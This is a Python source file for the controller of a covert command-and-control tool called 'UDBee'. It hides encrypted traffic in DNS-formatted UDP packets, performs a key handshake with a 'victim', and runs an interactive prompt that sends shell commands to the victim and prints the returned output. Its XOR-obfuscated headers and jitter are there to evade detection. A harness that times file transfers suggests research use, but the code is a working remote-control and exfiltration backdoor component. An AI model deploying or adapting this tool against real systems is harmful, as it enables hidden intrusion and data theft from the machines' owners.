import socket, random, time, sys, threading, argparse, zlib, statistics, csv, struct
import html as html_escape_module
from decryption import decrypt_symmetric, handshake_initiate_parser
from encryption import encrypt_symmetric, handshake_respond
from build_dns_message import dns_message
import cvc_codec # [IMPORTANT]
from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from check_missing import check_missing_packets
from generate_key_pairs import generate_key_pairs
from log import log_error, log_info, log_success, log_warn
from prompt_toolkit.shortcuts import print_formatted_text
from prompt_toolkit.formatted_text import HTML
from Crypto.PublicKey import ECC
from dnslib import DNSRecord

COMMAND_READY = threading.Event()

retransmission_count = 0
total_missing_packets = 0
parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
parser.add_argument("--received-chunks", type=int, default=255000, help="Max buffer size")
parser.add_argument("-delay", type=float, default=0, help="Delay between fragments")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer")
parser.add_argument("-jitter", type=float, default=0, help="Random jitter")
parser.add_argument('--generate-keys', action='store_true', default=False, help="Generate keys")
args = parser.parse_args()

my_ip = "0.0.0.0"
my_port = 27381
SERVER = (my_ip, my_port)

target_ip = None 
target_port = None 

# CVC Config: 13 bytes max (7 data + 6 header)
# Constraint: max 12 CVCs → 3 labels of ≤14 chars → 5 total depth
chunk_size = 13 
delay = args.delay
received_chunk_size = args.received_chunks
buffer_size = args.buffer
max_data_allowed = buffer_size * received_chunk_size
jitter = args.jitter 

my_priv_key = None
CURRENT_SESSION_KEY = None 

transmitted_messages = 0
received_chunks = {} 
expected_chunks = None
total_data_received = 0
last_received_time = None 
resends_requests = 0
sent_chunks = {} 

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def send_raw(payload_bytes):
    """Send unencrypted DNS packets (Handshake)"""
    global transmitted_messages
    try:
        if isinstance(payload_bytes, str):
            payload_bytes = payload_bytes.encode('utf-8')

        chunks = dns_message(payload_bytes, chunk_size)
        for chunk in chunks:
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
    except Exception as e:
        log_error(f"Send raw error: {e}")
        COMMAND_READY.set()

def send_msg(message, is_cached: bool):
    global transmitted_messages, CURRENT_SESSION_KEY, sent_chunks
    try:
        if isinstance(message, str):
            plaintext_bytes = message.encode('utf-8')
        else:
            plaintext_bytes = message

        if CURRENT_SESSION_KEY:
            encryption_result = encrypt_symmetric(plaintext_bytes, CURRENT_SESSION_KEY)
            if encryption_result.get("success") != True:
                log_error("Failed to encrypt command.")
                COMMAND_READY.set()
                return
            payload_bytes = encryption_result["message"] # Raw Bytes
        else:
            log_error("No active session key.")
            COMMAND_READY.set()
            return

        # dns_message handles CVC encoding
        chunks = dns_message(payload_bytes, chunk_size)

        sent_chunks = {}
        i = 0
        for chunk in chunks:
            if is_cached:
                sent_chunks[i] = chunk
            i += 1
            log_info(f"Sending chunk to {target_ip}:{target_port}")
            sock.sendto(chunk, (target_ip, target_port))
            transmitted_messages += 1
            # Minimum 10ms delay to prevent UDP buffer overflow on receiver
            jitter_delay = max(0.01, delay) + random.uniform(-jitter, jitter)
            jitter_delay = max(0.005, jitter_delay)  # Never go below 5ms
            time.sleep(jitter_delay)
            
    except Exception as e:
        log_error(f"Send msg error: {e}")
        COMMAND_READY.set()

def timeout_checker():
    """Detect incomplete responses and request retransmission of missing packets"""
    global received_chunks, expected_chunks, last_received_time, resends_requests, total_missing_packets, retransmission_count, CURRENT_SESSION_KEY
    while True:
        try:
            if last_received_time is not None:
                # [FIX] If no session key, we cannot request secure RESEND.
                # Just wait a bit longer or drop.
                if not CURRENT_SESSION_KEY:
                    if (time.time() - last_received_time) > 5:
                         log_warn("Handshake incomplete/dropped (Packet Loss). Waiting for next attempt...")
                         received_chunks.clear()
                         last_received_time = None
                    time.sleep(1)
                    continue

                if resends_requests < 6:
                    try:
                        current_session_id = None
                        current_buffer = None
                        if received_chunks:
                            current_session_id = next(iter(received_chunks))
                            current_buffer = received_chunks[current_session_id]["chunks"]
                            expected_chunks = received_chunks[current_session_id]["total"]
                        
                        # Check for reasonable total (Anti-Garbage Check)
                        # 10000 chunks = ~300KB max per message (30 bytes/chunk)
                        if expected_chunks and expected_chunks > 10000:
                             log_warn(f"Ignored garbage header (Total chunks: {expected_chunks})")
                             received_chunks.pop(current_session_id, None)
                             continue

                        if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 1.5):
                            missing_packets = check_missing_packets(current_buffer, expected_chunks)
                            if missing_packets:
                                log_info(f"<ansiyellow>Requesting {len(missing_packets)} missing packets...</ansiyellow>")
                                retransmission_count += 1
                                total_missing_packets += len(missing_packets)
                                indices_str = ",".join(str(i) for i in missing_packets)
                                msg = f"RESEND:{indices_str}"
                                send_msg(msg, False)
                                resends_requests += 1
                                time.sleep(1)
                                continue
                    except Exception as e:
                        log_error(f"Timeout checker error: {str(e)}")
                else:
                    log_error("<ansired>Incomplete response, giving up.</ansired>")
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
                    COMMAND_READY.set()
            time.sleep(0.5)
        except Exception:
            pass
        time.sleep(0.5)

def listener():
    global transmitted_messages, target_ip, target_port, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key
    
    while True:
        try:
            sock.bind(SERVER)
            log_success(f"<ansigreen>Binded successfully on {SERVER}</ansigreen>")
            break
        except:
            time.sleep(1)
            continue
    
    while True:
        try:
            data, addr = sock.recvfrom(4096)
            packet_length = len(data)
            total_data_received += packet_length
            transmitted_messages += 1
            
            if packet_length < 20: continue
            
            try:
                dns_request = DNSRecord.parse(data)
            except: continue

            # [CHANGE] Decode CVC Domain
            query_name = str(dns_request.q.qname).rstrip('.')
            raw_packet_bytes = cvc_codec.decode_domain_to_bytes(query_name)

            if not raw_packet_bytes or len(raw_packet_bytes) < 6:
                log_warn(f"Decode failed or too short: domain={query_name} -> {len(raw_packet_bytes) if raw_packet_bytes else 0} bytes")
                # Debug: run decode again with debug=True to see what's happening
                cvc_codec.decode_domain_to_bytes(query_name, debug=True)
                continue

            # Session ID comes from DNS Transaction ID (no longer in payload)
            session_id = dns_request.header.id

            # Unpack obfuscated header: [Salt][XOR'd Index][XOR'd Total]
            try:
                header_bytes = raw_packet_bytes[:6]
                chunk_data = raw_packet_bytes[6:]
                salt, xored_index, xored_total = struct.unpack('!HHH', header_bytes)
                # De-obfuscate: XOR back with salt to recover real values
                index = xored_index ^ salt
                total = xored_total ^ salt
                # Debug: detect garbage headers
                # 10000 chunks = ~300KB max per message (30 bytes/chunk)
                if total > 10000 or index >= total:
                    log_warn(f"Suspicious header: session={session_id}, index={index}, total={total}")
                    log_warn(f"Domain was: {query_name}")
                    log_warn(f"Decoded bytes: {raw_packet_bytes[:20].hex()}")
                    continue
            except: continue

            # Update Target Info
            target_ip, port = addr
            target_port = int(port)
            log_info(f"Victim connected from {target_ip}:{target_port}")
            last_received_time = time.time()
            
            if session_id not in received_chunks:
                received_chunks[session_id] = {"total": total, "chunks": {}}
                log_info(f"New message: session={session_id}, total={total} chunks")
            
            buffer = received_chunks[session_id]
            if index in buffer["chunks"]: continue
            buffer["chunks"][index] = chunk_data
            
            log_info(f"Chunk {index+1}/{total} received")
            
            if len(buffer["chunks"]) == buffer["total"]:
                log_info(f"Message complete: {buffer['total']} chunks")
                # Reassemble
                full_msg_bytes = b"".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
                log_info(f"Reassembled {len(full_msg_bytes)} bytes total")
                
                # Handshake Check
                try:
                    # Handshake packets are raw PEM bytes (not AES encrypted)
                    parsed = handshake_initiate_parser(full_msg_bytes)
                    if parsed and parsed.get("success"):
                        # If parsing succeeded, it's a handshake!
                        log_info("Handshake received from victim...")
                        victim_eph_pub_pem = parsed["victim_eph_pub_pem"]
                        
                        resp = handshake_respond(victim_eph_pub_pem, my_priv_key)
                        if resp and resp.get("success"):
                            CURRENT_SESSION_KEY = resp["master_key"]
                            send_raw(resp["message"]) # Send raw response
                            log_success("<ansigreen>Handshake complete. Session established.</ansigreen>")
                            
                            COMMAND_READY.set()
                            received_chunks.pop(session_id, None)
                            expected_chunks = None
                            resends_requests = 0
                            continue
                except: pass

                log_info(f"Not a handshake, checking for session key...")
                # Decryption Check
                if not CURRENT_SESSION_KEY:
                    # If not handshake and no key, drop it
                    log_warn("No session key, dropping message")
                    received_chunks.pop(session_id, None)
                    continue

                log_info(f"Decrypting {len(full_msg_bytes)} bytes...")
                decryption_result = decrypt_symmetric(full_msg_bytes, CURRENT_SESSION_KEY)
                
                if not (decryption_result and decryption_result.get("success")):
                    log_error(f"Decryption failed: {decryption_result}")
                    received_chunks.pop(session_id, None)
                    continue
                
                decrypted_bytes = decryption_result["message"]
                log_info(f"Decrypted to {len(decrypted_bytes)} bytes")
                
                # Decompress Zlib (Victim compresses responses)
                try:
                    full_msg = zlib.decompress(decrypted_bytes).decode("utf-8", errors="replace")
                    log_info(f"Decompressed to {len(full_msg)} chars")
                except Exception as e:
                    # Maybe it's not compressed (ACK / RESEND)
                    log_warn(f"Not compressed ({e}), treating as raw text")
                    full_msg = decrypted_bytes.decode("utf-8", errors="replace")
                
                if full_msg == "ACK":
                    sent_chunks = {}
                    last_received_time = None
                elif full_msg.startswith("RESEND:"):
                    try:
                        indices_str = full_msg.split(":", 1)[1]
                        missings = [int(i) for i in indices_str.split(',')]
                        log_info(f"<ansiyellow>Resending {len(missings)} packets...</ansiyellow>")
                        for missing_index in missings:
                            chunk = sent_chunks.get(missing_index)
                            if chunk:
                                sock.sendto(chunk, (target_ip, target_port))
                                time.sleep(0.01)
                    except Exception as e:
                        log_error(f"Resend error: {e}")
                elif full_msg == "heartbeat":
                    pass
                else:
                    # Use plain print for large responses to avoid HTML parsing issues
                    if len(full_msg) > 1000:
                        print(f"\n--- Response ({len(full_msg)} chars) ---")
                        print(full_msg)
                        print("--- End Response ---\n")
                    else:
                        try:
                            print_formatted_text(HTML(f"<ansigreen>{html_escape_module.escape(full_msg)}</ansigreen>"))
                        except Exception:
                            print(full_msg)
                    COMMAND_READY.set()
                
                received_chunks.pop(session_id, None)
                expected_chunks = None
                resends_requests = 0
                
        except Exception as e:
            log_error(f"Listener error: {str(e)}")
            pass

def run_test(command_name, command_str, iterations, csv_writer):
    global retransmission_count, total_missing_packets
    log_info(f"\n--- Starting Performance Test: '{command_name}' ({iterations} iterations) ---")
    timings_ms = []
    failures = 0
    successes = 0
    
    for i in range(iterations):
        retransmission_count = 0
        total_missing_packets = 0
        COMMAND_READY.clear()
        start_time = time.perf_counter()
        
        send_msg(command_str, True)
        
        success = COMMAND_READY.wait(timeout=120.0)
        end_time = time.perf_counter()
        
        duration_ms = (end_time - start_time) * 1000
        
        if not success:
            log_error(f"Iteration {i+1} FAILED (Timeout)")
            csv_writer.writerow([command_name, i+1, "FAILED", retransmission_count, total_missing_packets, "N/A"])
            failures += 1
        else:
            timings_ms.append(duration_ms)
            successes += 1
            log_info(f"Iteration {i+1}: {duration_ms:.2f} ms (Retrans: {retransmission_count}, Missing: {total_missing_packets})")
            csv_writer.writerow([command_name, i+1, "COMPLETED", retransmission_count, total_missing_packets, f"{duration_ms:.4f}"])
        
        time.sleep(0.3)

    if timings_ms:
        avg = statistics.mean(timings_ms)
        log_success(f"--- Test Complete: {successes}/{iterations} succeeded. Avg: {avg:.2f} ms, Failures: {failures} ---")
    else:
        log_error(f"--- Test FAILED: All {failures} iterations failed ---")
    
    print("\n")
    return timings_ms, failures

def main_test_harness():
    log_info("--- STARTING PERFORMANCE TEST ---")
    
    # Test files
    test_files = [
        ("1KB File", r"type C:\Users\ASUS\UDBee\entropy-analysis\results2\1kb.txt"),
        ("10KB File", r"type C:\Users\ASUS\UDBee\entropy-analysis\results2\10kb.txt"),
        ("50KB File", r"type C:\Users\ASUS\UDBee\entropy-analysis\results2\50kb.txt"),
    ]
    
    iterations_per_test = 500
    
    csv_filename = f"performance_results_{time.strftime('%Y%m%d-%H%M%S')}.csv"
    log_info(f"Results will be saved to: {csv_filename}")
    
    with open(csv_filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            "Command", 
            "Iteration", 
            "Status", 
            "RetransmissionRequests", 
            "TotalPacketsRetransmitted", 
            "Duration_ms"
        ])
        
        total_results = {}
        
        for test_name, command in test_files:
            log_info(f"\n{'='*60}")
            log_info(f"Starting test: {test_name}")
            log_info(f"Command: {command}")
            log_info(f"Iterations: {iterations_per_test}")
            log_info(f"{'='*60}")
            
            timings, failures = run_test(test_name, command, iterations_per_test, writer)
            total_results[test_name] = {
                "timings": timings,
                "failures": failures,
                "successes": len(timings)
            }
            
            # Flush after each test group
            f.flush()
    
    # Print summary
    log_info("\n" + "="*60)
    log_info("PERFORMANCE TEST SUMMARY")
    log_info("="*60)
    for test_name, results in total_results.items():
        if results["timings"]:
            avg = statistics.mean(results["timings"])
            min_t = min(results["timings"])
            max_t = max(results["timings"])
            log_info(f"{test_name}: {results['successes']}/{iterations_per_test} passed, Avg: {avg:.2f}ms, Min: {min_t:.2f}ms, Max: {max_t:.2f}ms")
        else:
            log_error(f"{test_name}: All {results['failures']} iterations FAILED")
    
    log_success(f"\nResults saved to: {csv_filename}")
    log_success("Tests Complete.")

def main():
    with patch_stdout():
        global my_priv_key, args, CURRENT_SESSION_KEY
        
        # Banner
        print_formatted_text(HTML("\n<ansimagenta>UDBee CVC Edition</ansimagenta> - <ansigreen>Stealth Mode</ansigreen>\n"))
        
        if args.generate_keys:
            generate_key_pairs()
            return
        
        try:
            with open('private_key.pem', 'r') as file:
                my_priv_key = ECC.import_key(file.read())
        except:
            log_error("Missing private_key.pem. Run with --generate-keys first.")
            return
        
        threads = [threading.Thread(target=listener), threading.Thread(target=timeout_checker)]
        for t in threads: t.start()
        
        log_info("Waiting for victim connection...")
        COMMAND_READY.wait()
        
        # main_test_harness()
        
        while True:
            if not COMMAND_READY.is_set():
                COMMAND_READY.wait()
            
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            COMMAND_READY.clear()
            
            if command.lower() in ["exit", "quit"]:
                sys.exit(0)
            elif command == "":
                COMMAND_READY.set()
                continue
            
            send_msg(command, True)

try:
    main()
except KeyboardInterrupt:
    exit()